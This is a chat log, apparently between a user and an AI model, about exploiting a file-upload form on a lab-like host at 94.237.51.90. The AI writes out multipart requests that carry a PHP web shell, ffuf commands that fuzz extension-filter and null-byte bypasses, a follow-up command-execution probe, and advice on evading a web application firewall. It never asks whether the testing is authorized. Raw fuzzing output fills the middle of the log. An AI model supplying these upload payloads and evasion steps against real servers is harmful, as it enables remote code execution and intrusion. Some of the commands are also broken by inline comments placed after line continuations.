@@ -1,0 +1,1776 @@
+POST /upload.php HTTP/1.1
+Host: 94.237.51.90:47341
+Content-Length: 186
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Origin: http://94.237.51.90:47341
+Referer: http://94.237.51.90:47341/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundaryr76uBlWtCOXnfvFH
+Content-Disposition: form-data; name="uploadFile"filename="shell%2ejpg%2ephp5%00"
+
+undefinegwen2
+------WebKitFormBoundaryr76uBlWtCOXnfvFH--
+ give me ffuf test code shellFUZZ with word2.txt(wordlist)
+Here's an ffuf test command to fuzz for file upload vulnerabilities based on your request, targeting the filename parameter:
+
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -H "Host: 94.237.51.90:47341" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Accept-Language: en-US,en;q=0.9" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -b "COOKIENAME=COOKIEVALUE" \  # Add if needed
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\nundefinegwen2\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -w word2.txt \
+     -fr "error|forbidden"  # Filter common error responses
+Important notes:
+
+This tests filename extensions from your wordlist (word2.txt)
+
+The null byte (%00) trick won't work with ffuf as it doesn't URL-encode payloads by default
+
+For null byte testing, you might need to manually craft requests or use another tool
+
+Adjust the boundary string if needed
+
+Add cookies if authentication is required
+
+Consider adding -mc all to see all status codes if needed
+
+Alternative approach for null byte testing:
+
+bash
+# Create a custom wordlist with null bytes
+sed 's/$/%00/' word2.txt > word2_null.txt
+
+# Then use this wordlist with -w word2_null.txt
+Remember to review the server's response patterns and adjust filters accordingly.
+
+please curl post /profile_images/%20.phar.jpg
+Here's a curl command to POST a file named %20.phar.jpg to the /profile_images/ endpoint:
+
+bash
+curl -i -X POST "http://94.237.51.90:47341/profile_images/%20.phar.jpg" \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "Accept: */*" \
+     -H "Accept-Language: en-US,en;q=0.9" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     --data-binary $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="%20.phar.jpg"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n'
+Key points about this command:
+
+The filename contains a space (%20) and double extension (.phar.jpg)
+
+The file content includes a simple PHP shell (adjust as needed)
+
+Uses the same boundary string from your original request
+
+Includes all relevant headers from your initial request
+
+If you need to:
+
+Add cookies: Use -b "cookie_name=cookie_value"
+
+Upload an actual file: Replace the --data-binary part with -F "uploadFile=@actual_file.phar.jpg"
+
+Test for null byte: Change filename to %20.phar.jpg%00 (though null byte may not work in all environments)
+
+Remember to check the server response to see if the upload was successful.
+
+%20.phar.jpg is in my loacl
+If you want to upload a local file named %20.phar.jpg using curl, here's the command:
+
+bash
+curl -X POST "http://94.237.51.90:47341/profile_images/" \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "Accept: */*" \
+     -H "Accept-Language: en-US,en;q=0.9" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -F "uploadFile=@%20.phar.jpg;filename=%20.phar.jpg"
+Explanation:
+-X POST: Sends a POST request to /profile_images/
+
+-F "uploadFile=@%20.phar.jpg": Uploads the local file (%20.phar.jpg) as a form field named uploadFile
+
+;filename=%20.phar.jpg ensures the filename is preserved (URL-encoded space as %20)
+
+All headers match your original request for consistency
+
+If the server expects a different field name:
+Replace uploadFile with the correct parameter (e.g., -F "file=@%20.phar.jpg")
+
+If you need to test for null byte truncation:
+bash
+-F "uploadFile=@%20.phar.jpg;filename=%20.phar.jpg%00"
+(Note: Some servers may block or filter null bytes.)
+
+Verify the upload:
+After uploading, check if the file is accessible at:
+
+bash
+curl "http://94.237.51.90:47341/profile_images/%20.phar.jpg"
+Let me know if you need adjustments! 🚀
+
+make ffuf code for fuzz
+Here's an optimized ffuf command to fuzz file uploads with %20.phar.jpg and other payloads from a wordlist (e.g., word2.txt):
+
+bash
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \  # Add session cookie if needed
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -fr "error|forbidden|denied" \
+     -o fuzz_results.json \
+     -t 50 \
+     -rate 10
+Key Features:
+Smart Fuzzing:
+
+Tests all entries in word2.txt as filenames (e.g., %20.phar.jpg, .htaccess, shell.php5)
+
+Automatically handles the multipart boundary
+
+Filtering:
+
+-fr filters out common error responses
+
+Focuses on potentially successful uploads
+
+Performance:
+
+-t 50 for 50 concurrent threads
+
+-rate 10 limits to 10 requests/sec (adjust as needed)
+
+Output:
+
+Saves results to fuzz_results.json
+
+Advanced Version (Null Byte Testing):
+bash
+# Create a null-byte wordlist
+sed 's/$/%00/' word2.txt > word2_null.txt
+
+# Run ffuf with null-byte variants
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -w word2_null.txt \
+     [other parameters from above]
+Pro Tips:
+For LFI testing, chain with:
+
+bash
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ?cmd=id" \
+     -w successful_uploads.txt
+Use -mc all -ac to auto-calibrate response filtering
+
+Would you like me to add any specific test cases (e.g., double extensions, case bypass)?
+
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \  # Add session cookie if needed
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -fr "error|forbidden|denied" \
+     -o fuzz_results.json \
+     -t 50 \
+     -rate 10
+Here
+
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \  # Add session cookie if needed
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -fr "error|forbidden|denied" \
+     -o fuzz_results.json \
+     -t 50 \
+     -rate 10
+Here
+
+└─$ ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -X POST \
+     -w word2.txt \  
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \  # Add session cookie if needed
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -fr "error|forbidden|denied" \
+     -o fuzz_results.json \
+     -t 50 \
+     -rate 10
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://94.237.51.90:47341/profile_images/FUZZ
+ :: Wordlist         : FUZZ: /home/euyin/Desktop/word2.txt
+ :: Header           : Cookie: PHPSESSID=12345
+ :: Header           : Host: 94.237.51.90:47341
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+ :: Header           : X-Requested-With: XMLHttpRequest
+ :: Header           : Origin: http://94.237.51.90:47341
+ :: Header           : Referer: http://94.237.51.90:47341/
+ :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [40/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [50/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [50/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [60/3452] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [60/3452] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:01] :: Eshell.jpg%0a.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+:: Progress: [69/3452] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:01] :: E:: Progress: [71/3452] :: Job [1/1] :: 58 req/sec :: Duration: [0:00:01] :: E:: Progress: [71/3452] :: Job [1/1] :: 58 req/sec :: Duration: [0:00:01] :: E:: Progress: [82/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:01] :: E:: Progress: [82/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:01] :: E:: Progress: [93/3452] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:01] :: E:: Progress: [93/3452] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:01] :: E:: Progress: [104/3452] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:01] :: :: Progress: [104/3452] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:02] :: :: Progress: [117/3452] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:02] :: :: Progress: [117/3452] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:02] :: :: Progress: [130/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: :: Progress: [130/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: :: Progress: [143/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: :: Progress: [143/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: :: Progress: [156/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:02] :: :: Progress: [156/3452] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:03] :: :: Progress: [173/3452] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:03] :: :: Progress: [173/3452] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:03] :: shell.jpg%0d0a.phps     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+:: Progress: [173/3452] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:03] :: :: Progress: [189/3452] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:03] :: :: Progress: [190/3452] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:03] :: :: Progress: [205/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:03] :: :: Progress: [207/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:03] :: shell.phps/.jpg         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+:: Progress: [220/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:03] :: :: Progress: [221/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:03] :: shell.jpg.phps/         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+:: Progress: [222/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:03] :: :: Progress: [223/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:04] :: shell.jpg%20.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3768ms]
+:: Progress: [227/3452] :: Job [1/1] :: 53 req/sec :: Duration: [0:00:04] :: :: Progress: [244/3452] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:04] :: :: Progress: [247/3452] :: Job [1/1] :: 54 req/sec :: Duration: [0:00:04] :: :: Progress: [268/3452] :: Job [1/1] :: 59 req/sec :: Duration: [0:00:04] :: :: Progress: [272/3452] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:04] :: shell.jpg.\\.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+:: Progress: [279/3452] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:04] :: :: Progress: [292/3452] :: Job [1/1] :: 65 req/sec :: Duration: [0:00:04] :: :: Progress: [296/3452] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:04] :: :: Progress: [314/3452] :: Job [1/1] :: 71 req/sec :: Duration: [0:00:04] :: :: Progress: [321/3452] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:05] :: shell.jpg..phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+:: Progress: [344/3452] :: Job [1/1] :: 88 req/sec :: Duration: [0:00:05] :: :: Progress: [352/3452] :: Job [1/1] :: 86 req/sec :: Duration: [0:00:05] :: :: Progress: [361/3452] :: Job [1/1] :: 92 req/sec :: Duration: [0:00:05] :: :: Progress: [391/3452] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:05] ::shell.jpg&.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+:: Progress: [392/3452] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:05] :::: Progress: [401/3452] :: Job [1/1] :: 106 req/sec :: Duration: [0:00:05] :::: Progress: [430/3452] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:05] :::: Progress: [441/3452] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:05] ::shell.jpg:.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+:: Progress: [441/3452] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:05] :::: Progress: [469/3452] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:05] :::: Progress: [481/3452] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:06] ::shell.jpg%3B.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+:: Progress: [490/3452] :: Job [1/1] :: 137 req/sec :: Duration: [0:00:06] ::shell.jpg%26.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpg%23.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 266ms]
+shell.jpg.phps          [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.jpeg%20.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.jpeg%20.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.jpeg%0a.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.jpeg%0a.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 265ms]
+shell.jpeg%0d0a.phps    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 270ms]
+shell.jpeg%0d0a.phps    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 264ms]
+shell.phps/.jpeg        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpeg.phps/        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.jpeg.phps/        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.phps/.jpeg        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.jpeg.\\.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpeg.\\.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 261ms]
+shell.jpeg..phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.jpeg..phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.jpeg&.phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpeg&.phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 254ms]
+shell.jpeg:.phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpeg:.phps        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 254ms]
+shell.jpeg%3B.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 265ms]
+shell.jpeg%3B.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 257ms]
+shell.jpeg%26.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.jpeg%26.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.jpeg%23.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 263ms]
+shell.jpeg%23.phps      [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 261ms]
+shell.jpeg.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.png%20.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.png%20.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.png%0a.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.png%0a.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.png%0d0a.phps     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 257ms]
+shell.png%0d0a.phps     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.phps/.png         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.png.phps/         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.phps/.png         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 257ms]
+shell.png.phps/         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.png.\\.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.png.\\.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.png..phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 262ms]
+shell.png..phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.png&.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 254ms]
+shell.png&.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 261ms]
+shell.png:.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 261ms]
+shell.png:.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.png%3B.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.png%3B.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.png%26.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.png%26.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 263ms]
+shell.png%23.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 265ms]
+shell.png%23.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.jpeg.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.gif%20.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.gif%20.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif%0a.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.gif%0a.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 261ms]
+shell.gif%0d0a.phps     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.gif%0d0a.phps     [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.phps/.gif         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.gif.phps/         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.phps/.gif         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+shell.gif.phps/         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.gif.\\.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif.\\.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 260ms]
+shell.gif..phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.gif..phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif&.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.gif&.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 264ms]
+shell.gif:.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif:.phps         [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif%3B.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 257ms]
+shell.gif%3B.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 255ms]
+shell.gif%26.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 258ms]
+shell.gif%26.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 259ms]
+shell.gif%23.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 262ms]
+shell.gif%23.phps       [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 257ms]
+shell.gif.phps          [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 256ms]
+:: Progress: [3452/3452] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
+-d: command not found
+It looks like you're encountering an issue with the ffuf command execution. The error -d: command not found suggests there might be a problem with how the command is being interpreted by your shell. Here's how to fix and optimize your fuzzing approach:
+
+Fixed FFUF Command
+bash
+ffuf -u "http://94.237.51.90:47341/profile_images/" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \
+     -d "------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"FUZZ\"\r\n\r\n<?php system(\$_GET[\"cmd\"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n" \
+     -fr "error|forbidden|denied" \
+     -o fuzz_results.json \
+     -t 40 \
+     -rate 10
+Key Observations from Your Output:
+403 Forbidden Responses: All attempts are being blocked (403 status)
+
+Possible WAF: The consistent 403s suggest a Web Application Firewall is blocking your fuzzing attempts
+
+Rate Limiting: Some responses took ~3.7s (like shell.jpg%20.phps), indicating possible rate limiting
+
+Recommended Adjustments:
+Slow Down the Attack:
+
+bash
+-t 20 -rate 5  # Reduce threads and requests/sec
+Try Different Bypass Techniques:
+
+bash
+# Create a custom wordlist with these variations:
+echo -e ".htaccess\n.htaccess.bak\n.%20.phar.jpg\nshell.pHp5\nshell.php\x00.jpg" > bypass.txt
+Alternative Approach with File Upload:
+
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -w bypass.txt \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTEST" \
+     -F "uploadFile=@test.jpg;filename=FUZZ" \
+     -fr "403"
+Check for LFI First:
+
+bash
+ffuf -u "http://94.237.51.90:47341/profile_images/FUZZ" \
+     -w word2.txt \
+     -recursion -recursion-depth 2
+Next Steps:
+First identify if any files are accessible in /profile_images/
+
+Try simpler GET requests before POST fuzzing
+
+Check if the WAF has any bypasses (like HTTP parameter pollution)
+
+Test with different content types (try application/x-www-form-urlencoded)
+
+The consistent 403 responses suggest you'll need to either:
+
+Find the WAF's whitelisted patterns
+
+Slow down your attack rate
+
+Try different request formatting
+
+Would you like me to suggest specific WAF bypass techniques for this scenario?
+
+I need a "successfully uploaded" response form the server So i need to filter that result
+To filter for successful uploads in ffuf, you'll need to analyze the server's responses and craft appropriate matchers/filters. Based on your earlier output showing consistent 403 responses, here's how to refine your approach:
+
+Optimized FFUF Command for Successful Upload Detection
+bash
+ffuf -u "http://94.237.51.90:47341/upload.php" \
+     -X POST \
+     -w word2.txt \
+     -H "Host: 94.237.51.90:47341" \
+     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
+     -H "X-Requested-With: XMLHttpRequest" \
+     -H "Origin: http://94.237.51.90:47341" \
+     -H "Referer: http://94.237.51.90:47341/" \
+     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr76uBlWtCOXnfvFH" \
+     -b "PHPSESSID=12345" \
+     -d $'------WebKitFormBoundaryr76uBlWtCOXnfvFH\r\nContent-Disposition: form-data; name="uploadFile"; filename="FUZZ"\r\n\r\n<?php system($_GET["cmd"]); ?>\r\n------WebKitFormBoundaryr76uBlWtCOXnfvFH--\r\n' \
+     -mr "success|uploaded|200 OK" \  # Match responses containing these phrases
+     -mc 200 \                       # Match HTTP 200 status
+     -fw 0 \                         # Filter out responses with 0 words
+     -o fuzz_results.json \
+     -t 20 \
+     -rate 5
+Key Adjustments:
+Response Matchers:
+
+-mr "success|uploaded|200 OK" - Looks for these success indicators
+
+-mc 200 - Only shows HTTP 200 responses
+
+-fw 0 - Filters empty responses
+
+Slower Rate:
+
+Reduced to -t 20 -rate 5 to avoid WAF blocking
+
+Alternative Success Detection:
